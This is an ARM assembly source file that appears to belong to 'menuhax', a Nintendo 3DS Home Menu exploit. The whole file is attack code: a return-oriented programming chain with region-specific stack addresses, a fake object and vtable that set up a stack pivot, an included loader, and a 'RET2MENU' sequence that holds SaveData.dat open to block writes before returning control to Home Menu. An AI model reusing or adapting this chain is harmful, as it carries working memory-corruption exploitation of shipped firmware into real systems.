.arm
.section .init
.global _start

#include "menuhax_ropinclude.s"

#if REGIONVAL!=4//non-KOR
#define SDICONHAX_SPRETADDR (0x0ffffe20 - (6*4)) //SP address right before the original stack-pivot was done.
#else//KOR
#define SDICONHAX_SPRETADDR (0x0ffffe18 - (6*4))
#endif

_start:

ropstackstart:

@ *(saved_r4+0x0) = <value setup by menuhax_manager>, aka the original address for the first objptr.
ROPMACRO_LDDRR0_ADDR1_STRVALUE SDICONHAX_SPRETADDR, 0x0, (0x58414800 + 0x00)

@ *(saved_r4+0x4) = <value setup by menuhax_manager>, aka the original address for the second objptr.
ROPMACRO_LDDRR0_ADDR1_STRVALUE SDICONHAX_SPRETADDR, 0x4, (0x58414800 + 0x01)

@ Subtract the saved r4 on stack by 4. This results in the current objptr in the target_objectslist_buffer being reprocessed @ RET2MENU.
ROPMACRO_LDDRR0_ADDR1_STRADDR SDICONHAX_SPRETADDR, SDICONHAX_SPRETADDR, 0xfffffffc

#include "menuhax_loader.s"

@ The ROP used for RET2MENU starts here.

@ Open the SaveData.dat extdata for reading without doing anything with it besides opening it. This blocks the actual Home Menu code from writing to SaveData.dat, since fsuser doesn't allow writing to files which are currently open for reading.
CALLFUNC_NOSP IFile_Open, ROPBUFLOC(savedatadat_filectx), ROPBUFLOC(savedatadat_filepath), 0x1, 0

ROPMACRO_STACKPIVOT SDICONHAX_SPRETADDR, POP_R4R8PC @ Return to executing the original homemenu code.

object:
.word ROPBUFLOC(vtable) @ object+0, vtable ptr
.word 0
.word 0
.word 0

.word ROPBUFLOC(object + 0x20) @ This .word is at object+0x10. ROP_LOADR4_FROMOBJR0 loads r4 from here.

.space ((object + 0x1c) - .) @ sp/pc data loaded by STACKPIVOT_ADR.
stackpivot_sploadword:
.word ROPBUFLOC(ropstackstart) @ sp
stackpivot_pcloadword:
.word ROP_POPPC @ pc

vtable:
.word 0, 0 @ vtable+0
.word 0//ROP_LOADR4_FROMOBJR0 @ vtable funcptr +8
.word 0//STACKPIVOT_ADR @ vtable funcptr +12, called via ROP_LOADR4_FROMOBJR0.

savedatadat_filectx:
.space 0x20

savedatadat_filepath:
.string16 "EXT:/SaveData.dat"
.align 2

